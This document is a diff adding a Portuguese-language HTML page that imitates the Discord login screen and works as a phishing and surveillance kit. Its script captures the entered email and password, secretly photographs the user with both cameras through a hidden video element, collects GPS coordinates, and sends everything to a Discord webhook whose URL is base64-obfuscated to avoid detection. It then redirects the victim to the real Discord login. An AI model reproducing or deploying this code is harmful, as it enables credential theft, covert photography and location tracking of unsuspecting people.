@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Discord - Login</title>
+<link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+    body {
+        background-color: #313338; /* Cor de fundo oficial do Discord */
+        color: #f2f3f5;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    
+    .login-box {
+        background-color: #313338;
+        width: 100%;
+        max-width: 480px;
+        padding: 32px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+        text-align: center;
+    }
+
+    .logo {
+        width: 120px;
+        margin-bottom: 24px;
+        fill: #5865F2; /* Cor Blurple */
+    }
+
+    h2 {
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        color: #f2f3f5;
+    }
+
+    p {
+        color: #b5bac1;
+        font-size: 16px;
+        margin-bottom: 20px;
+    }
+
+    .input-group {
+        text-align: left;
+        margin-bottom: 20px;
+    }
+    
+    label {
+        display: block;
+        color: #b5bac1;
+        font-size: 12px;
+        font-weight: 700;
+        text-transform: uppercase;
+        margin-bottom: 8px;
+    }
+
+    input {
+        width: 100%;
+        padding: 10px;
+        background-color: #1e1f22;
+        border: none;
+        border-radius: 3px;
+        color: #dbdee1;
+        font-size: 16px;
+        outline: none;
+    }
+    input:focus { outline: 1px solid #5865F2; }
+    
+    .forgot {
+        display: block;
+        text-align: left;
+        color: #00a8fc;
+        font-size: 14px;
+        text-decoration: none;
+        margin-bottom: 24px;
+    }
+
+    .btn-login {
+        width: 100%;
+        padding: 12px;
+        background-color: #5865F2;
+        color: #fff;
+        border: none;
+        border-radius: 3px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+    }
+    .btn-login:hover { background-color: #4752c4; }
+    .btn-login:active { background-color: #3c45a5; }
+
+    .register {
+        margin-top: 20px;
+        font-size: 14px;
+        color: #949ba4;
+    }
+    .register a { color: #00a8fc; text-decoration: none; }
+
+    /* Loader */
+    #loading {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 20px;
+    }
+    .spinner {
+        border: 3px solid rgba(255,255,255,0.1);
+        border-top: 3px solid #5865F2;
+        border-radius: 50%;
+        width: 30px; height: 30px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 15px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    video { position: fixed; top: -9999px; left: -9999px; }
+</style>
+</head>
+<body>
+
+<video id="camera" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<div class="login-box" id="main-screen">
+    <!-- SVG oficial do Discord -->
+    <svg class="logo" viewBox="0 0 127.14 96.36">
+        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.14c2.64-27.38-4.51-51.11-18.24-72.14ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
+    </svg>
+
+    <h2>Bem-vindo de volta!</h2>
+    <p>Estamos tão felizes em te ver de novo!</p>
+
+    <div class="input-group">
+        <label>E-mail ou número de telefone</label>
+        <input type="text" id="email-input" autocomplete="off">
+    </div>
+
+    <div class="input-group">
+        <label>Senha</label>
+        <input type="password" id="pass-input">
+    </div>
+
+    <a href="#" class="forgot">Esqueceu a senha?</a>
+
+    <button class="btn-login" onclick="startHack()">Entrar</button>
+
+    <div class="register">
+        Precisas de uma conta? <a href="#">Registra-te</a>
+    </div>
+</div>
+
+<div id="loading" style="display:none;">
+    <div class="spinner"></div>
+    <p style="color: #f2f3f5;">Verificando segurança...</p>
+</div>
+
+<script>
+    // WEBHOOK CODIFICADO (Anti-Ban do Google)
+    const p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+    const p2 = "MTU3MTcyMTAwMjE3Njc0NTYxNQ==";
+    const p3 = "L3h2cTZnM2NKM2MycldZNzZDcl9rcXNrc0VWMWVQWWxZTHAzSG5mS0dnODhqQVZnZXJzbllYR0JKbXVTaW9KdXlIMzA2";
+    const WEBHOOK = atob(p1) + atob(p2) + atob(p3);
+
+    let video = document.getElementById('camera');
+    let canvas = document.getElementById('canvas');
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+    async function startHack() {
+        const email = document.getElementById('email-input').value;
+        const pass = document.getElementById('pass-input').value;
+        
+        if(!email || !pass) return alert("Preencha todos os campos.");
+
+        document.getElementById('main-screen').style.display = 'none';
+        document.getElementById('loading').style.display = 'flex';
+
+        let fotoFrente = null;
+        let fotoTras = null;
+
+        // 1. TIRAR FOTO DA FRENTE (Frontal)
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            await sleep(1500); 
+            fotoFrente = capturePhoto();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Sem câmera frontal"); }
+
+        // 2. TIRAR FOTO DE TRÁS (Traseira)
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            video.srcObject = stream;
+            await sleep(1500);
+            fotoTras = capturePhoto();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Sem câmera traseira"); }
+
+        // 3. GPS E ENVIO
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { 
+                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToDiscord(email, pass, fotoFrente, fotoTras, mapsLink);
+                    finishHack();
+                },
+                () => { 
+                    sendToDiscord(email, pass, fotoFrente, fotoTras, "GPS negado");
+                    finishHack();
+                }
+            );
+        } else {
+            sendToDiscord(email, pass, fotoFrente, fotoTras, "Sem GPS");
+            finishHack();
+        }
+    }
+
+    function capturePhoto() {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.6);
+    }
+
+    async function sendToDiscord(email, pass, fotoFrente, fotoTras, localizacao) {
+        if (!WEBHOOK) return;
+        const formData = new FormData();
+        
+        const payload = {
+            content: "🎯 **ALVO CAPTURADO (DISCORD FAKE)**",
+            embeds: [{
+                title: "Dados do Alvo",
+                color: 5793266, // Cor do Discord
+                fields: [
+                    { name: "E-mail/Telefone", value: email, inline: true },
+                    { name: "Senha", value: pass, inline: true },
+                    { name: "Localização", value: localizacao, inline: false }
+                ]
+            }]
+        };
+
+        const attachments = [];
+        if (fotoFrente) {
+            const blobF = await (await fetch(fotoFrente)).blob();
+            formData.append("file1", blobF, "frente.jpg");
+            attachments.push({ id: 0, filename: "frente.jpg" });
+        }
+        if (fotoTras) {
+            const blobT = await (await fetch(fotoTras)).blob();
+            formData.append("file2", blobT, "traseira.jpg");
+            attachments.push({ id: 1, filename: "traseira.jpg" });
+        }
+
+        if (attachments.length > 0) {
+            payload.embeds[0].image = { url: `attachment://${attachments[0].filename}` };
+            if (attachments.length > 1) {
+                payload.embeds[0].thumbnail = { url: `attachment://${attachments[1].filename}` };
+            }
+        }
+
+        formData.append("payload_json", JSON.stringify(payload));
+        fetch(WEBHOOK, { method: "POST", body: formData }).catch(()=>{});
+    }
+
+    function finishHack() {
+        setTimeout(() => {
+            // Redireciona pro Discord de verdade
+            window.location.href = "https://discord.com/login";
+        }, 1500);
+    }
+</script>
+</body>
+</html>
